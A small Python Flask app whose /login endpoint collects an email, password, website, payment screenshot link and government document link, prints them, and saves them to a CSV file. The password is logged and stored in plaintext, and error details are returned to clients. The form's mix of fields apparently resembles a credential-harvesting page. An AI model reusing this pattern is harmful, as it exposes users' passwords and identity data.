from flask import Flask, request, jsonify, render_template, redirect, url_for
import csv

app = Flask(__name__)

# Define the path to the CSV file
csv_file_path = "D:\\cxo\\profile.csv"

# Function to save form data to CSV
def save_to_csv(data):
    with open(csv_file_path, mode='w', newline='') as csv_file:
        writer = csv.writer(csv_file)
        writer.writerow(["Email", "Password", "Channel or Website", "Payment Screenshot Link", "Gov Approved Document Link"])
        writer.writerow(data)

# Endpoint to render the HTML form
@app.route('/')
def index():
    return render_template('index.html')

# Endpoint to handle form submission
@app.route('/login', methods=['POST'])
def login():
    try:
        # Get form data from the request
        email = request.form.get('email')
        password = request.form.get('password')
        channelOrWebsite = request.form.get('channelOrWebsite')
        paymentScreenshotLink = request.form.get('paymentScreenshotLink')
        govApprovedDocumentLink = request.form.get('govApprovedDocumentLink')

        # Log the received data to the terminal
        print(f"Received form data:\n"
              f"Email: {email}\n"
              f"Password: {password}\n"
              f"Channel or Website: {channelOrWebsite}\n"
              f"Payment Screenshot Link: {paymentScreenshotLink}\n"
              f"Gov Approved Document Link: {govApprovedDocumentLink}")

        # Save form data to CSV
        save_to_csv([email, password, channelOrWebsite, paymentScreenshotLink, govApprovedDocumentLink])

        # Redirect to the login page after successful signup
        return jsonify({"success": True}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Endpoint to render the subscription page
@app.route('/subscription.html')
def subscription():
    return render_template('subscription.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
